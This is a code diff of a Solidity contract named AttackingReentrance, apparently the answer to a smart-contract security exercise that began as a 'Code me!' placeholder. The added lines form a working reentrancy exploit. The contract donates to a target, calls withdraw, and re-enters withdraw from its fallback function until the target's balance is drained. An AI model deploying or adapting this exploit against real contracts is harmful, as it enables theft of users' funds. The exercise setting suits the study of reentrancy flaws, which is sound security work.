@@ -5,18 +5,27 @@ import "./Reentrance.sol";
 interface ReentranceInterface {
     function donate(address _to) external payable;
     // function balanceOf(address _who) public view returns (uint256 balance);
-    function withdraw(uint _amount) external;
+    function withdraw() external;
 }
 
 contract AttackingReentrance {
     address payable public contractAddress;
+    ReentranceInterface public reentranceContract;
 
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        reentranceContract = ReentranceInterface(_contractAddress);
     }
 
-    function hackContract() external {
+    function hackContract() external payable {
         // Code me!
-        ReentranceInterface victimContract = ReentranceInterface(contractAddress);
+        reentranceContract.donate{value: address(this).balance }(address(this));
+        reentranceContract.withdraw();
+    }
+
+    fallback() external payable {
+        if (address(contractAddress).balance > 0) {
+            reentranceContract.withdraw();
+        }
     }
 }
